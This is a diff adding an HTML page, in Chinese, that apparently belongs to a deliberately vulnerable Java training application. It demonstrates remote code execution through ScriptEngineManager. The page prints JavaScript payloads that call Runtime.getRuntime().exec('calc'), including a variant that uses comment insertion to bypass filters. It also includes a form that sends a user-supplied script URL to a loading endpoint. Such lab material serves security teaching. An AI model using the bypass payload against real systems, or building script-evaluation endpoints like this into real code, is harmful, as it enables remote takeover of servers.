@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<div th:replace="~{commons/commons::head}"></div>
+
+<body>
+<div class="layuimini-container">
+    <div class="layuimini-main">
+        <div class="layui-row layui-col-space15">
+            <div class="layui-col-md12">
+                <div class="layui-row layui-col-space10">
+                    <fieldset class="layui-elem-field layui-field-title" style="margin-top: 20px;">
+                        <legend>远程代码执行--ScriptEngineManager</legend>
+                    </fieldset>
+                    <!--漏洞简介-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-eyedropper icon"></i>漏洞描述</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <p>在Java 8之后ScriptEngineManager的eval函数就没有了</p>
+                                <p>windows: var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("calc")};</p>
+                                <p>Payload绕过: var a = mainOutput(); function mainOutput() { var x=java.lang.\/****\/Runtime.getRuntime().exec("calc");}</p>
+                            </div>
+                        </div>
+                    </div>
+                    <!--漏洞测试-->
+                    <div class="layui-col-md12">
+                        <div class="layui-card">
+                            <div class="layui-card-header"><i class="fa fa-hand-o-down icon"></i>漏洞测试</div>
+                            <div class="layui-card-body layui-text layadmin-text">
+                                <form class="layui-form" th:action="@{/home/rce/loadjs}" method="get">
+                                    <div class="layui-form-item">
+                                        <label class="layui-form-label">请输入url</label>
+                                        <div class="layui-input-block">
+                                            <input type="text" name="cmd" lay-verify="required" lay-reqtext="url不能为空" placeholder="example: http://127.0.0.1/1.js" autocomplete="off" class="layui-input">
+                                        </div>
+                                    </div>
+
+                                    <div class="layui-form-item">
+                                        <div class="layui-input-block">
+                                            <button class="layui-btn" lay-submit="" lay-filter="demo1">立即提交</button>
+                                            <button type="reset" class="layui-btn layui-btn-primary">重置</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                    <!--执行结果-->
+                    <div th:replace="~{commons/commons::results}"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div th:replace="~{commons/commons::script}">
+</div>
+</body>
+</html>
